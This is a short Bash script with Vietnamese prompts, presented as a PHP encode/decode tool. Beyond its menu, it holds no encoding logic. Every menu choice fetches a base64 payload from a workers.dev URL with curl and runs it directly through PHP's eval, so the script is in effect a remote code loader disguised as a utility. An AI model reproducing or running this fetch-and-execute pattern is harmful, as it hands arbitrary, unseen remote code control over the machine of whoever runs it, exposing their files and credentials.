#!/usr/bin/env bash

clear
echo -e "===== [TOOL PHP SYSTEM BY AN ORIN] =====\n"

echo "[1] Encode File"
echo "[2] Decode File"
echo "[3] Decode URL"
echo "[4] Encode URL"

read -p "Chọn: " choose

case $choose in
    1) mode=8 ;;
    2) mode=10 ;;
    3) mode=12 ;;
    4) mode=14 ;;
    *) echo "Sai lựa chọn"; exit ;;
esac

URL="https://old-rain-6157.anorintool.workers.dev/?mode=$mode"

echo "[+] Đang tải và thực thi..."

curl -s "$URL" \
| php -r '
$data = json_decode(stream_get_contents(STDIN), true);

if (!$data || !isset($data["status"])) {
    exit("❌ JSON lỗi\n");
}

if ($data["status"] !== "success") {
    exit("⚠️ API lỗi\n");
}

if (empty($data["data"])) {
    exit("⚠️ Không có dữ liệu\n");
}

$real = base64_decode($data["data"]);

if ($real === false || trim($real) === "") {
    exit("⚠️ Decode rỗng\n");
}

eval("?>".$real);
'